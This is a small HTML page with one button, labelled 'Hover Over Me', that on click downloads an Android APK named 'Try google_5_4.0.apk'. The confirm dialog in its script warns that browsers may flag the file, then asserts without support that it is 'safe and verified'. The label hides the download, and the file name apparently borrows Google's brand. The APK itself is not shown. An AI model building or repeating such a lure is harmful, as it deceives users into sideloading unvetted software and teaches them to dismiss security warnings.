<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  display: flex;
  justify-content: center;
  align-items: center;  
  margin-top: 100px;
}

a {
  text-decoration: none;
}

.btn {
  background-color: black;
  border: none;
  color: white;
  padding: 16px 32px;
  text-align: center;
  font-size: 16px;
  margin: 4px 2px;
  opacity: 0.6;
  transition: 0.3s;
}

.btn:hover {
  opacity: 1;
}
</style>
</head>
<body>

<h2 style="display: none;">Fading Buttons - "Fade in Effect"</h2> <!-- Optional hidden heading -->

<!-- Button for downloading the APK -->
<button class="btn" id="downloadBtn">Hover Over Me</button>

<script>
  document.getElementById('downloadBtn').addEventListener('click', function() {
      let userConfirmed = confirm("You are about to download an APK file. Some browsers may show a security warning. The file is safe and verified.");
      
      if (userConfirmed) {
          // Trigger the file download
          window.location.href = 'file/Try google_5_4.0.apk'; // Replace with the actual file URL
      }
  });
</script>

</body>
</html>
